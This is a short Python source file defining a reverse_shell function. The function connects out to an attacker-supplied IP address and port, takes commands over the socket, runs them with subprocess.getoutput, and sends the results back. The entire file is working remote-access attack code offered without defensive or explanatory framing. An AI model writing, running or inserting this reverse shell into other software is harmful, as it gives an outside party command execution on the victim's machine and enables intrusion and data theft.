import socket
import subprocess
import sys

def reverse_shell(attacker_ip, attacker_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, int(attacker_port)))

        s.send(b"[*] Connection established!\n")

        while True:
            command = s.recv(1024).decode().strip()
            if command.lower() == "exit":
                break

            if command:
                output = subprocess.getoutput(command)
                s.send(output.encode() + b"\n")
        
        s.close()
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)
